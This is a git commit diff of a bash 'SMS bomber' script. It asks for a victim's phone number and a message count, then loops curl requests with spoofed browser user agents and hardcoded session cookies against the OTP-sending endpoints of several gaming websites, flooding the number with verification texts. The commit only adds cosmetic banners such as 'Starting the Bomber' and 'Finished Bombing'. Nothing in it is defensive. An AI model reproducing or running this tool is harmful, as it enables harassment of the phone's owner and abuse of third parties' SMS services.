47b116fe40f5660a3a35e97116cb0a243b7e1f6c
apt-x4869 <55894766+apt-x4869@users.noreply.github.com>
2019-10-31 21:33:59 +0530

    Update bom.sh

--- bom.sh
+++ bom.sh
@@ -1,8 +1,18 @@
 #!/bin/bash
-echo please enter the mobile number..
+banner()
+{
+  echo "+------------------------------------------+"
+  printf "| %-40s |\n" "`date`"
+  echo "|                                          |"
+  printf "|`tput bold` %-40s `tput sgr0`|\n" "$@"
+  echo "+------------------------------------------+"
+}
+banner "Starting the Bomber for you..."
+echo Please enter the mobile number..
 read phonen
-echo enter no of sms...
+echo Enter no of sms...
 read nos
+banner "Good to go..."
 for x in {1..nos}
 do
 curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --cookie "__cfduid=d1d4ecdbd06a0ff1d9f9bb49a7437e1971552854291; _fbp=fb.1.1552843496379.413177475; _ga=GA1.2.588183707.1552843499; ASPSESSIONIDQQQRTRSR=DOOJLNKAENEKGABNLIPCAMFH" --url "http://pokersaint.com/SendOTP.asp?For=Phone&PhoneNo=$phonen"
@@ -12,3 +22,4 @@ curl http://thespartanpoker.com/smsc?PHONE=$phonen
 curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --cookie "__cfduid=d1d4ecdbd06a0ff1d9f9bb49a7437e1971552854291; _fbp=fb.1.1552843496379.413177475; _ga=GA1.2.588183707.1552843499; ASPSESSIONIDQQQRTRSR=DOOJLNKAENEKGABNLIPCAMFH" --url "http://chipbazar.com/SendOTP.asp?For=Phone&PhoneNo=$phonen"
 curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --cookie "__cfduid=d1d4ecdbd06a0ff1d9f9bb49a7437e1971552854291; _fbp=fb.1.1552843496379.413177475; _ga=GA1.2.588183707.1552843499; ASPSESSIONIDQQQRTRSR=DOOJLNKAENEKGABNLIPCAMFH" --url "http://callingstation.in/SendOTP.asp?For=Phone&PhoneNo=$phonen"
 done
+banner "Finished Bombing"
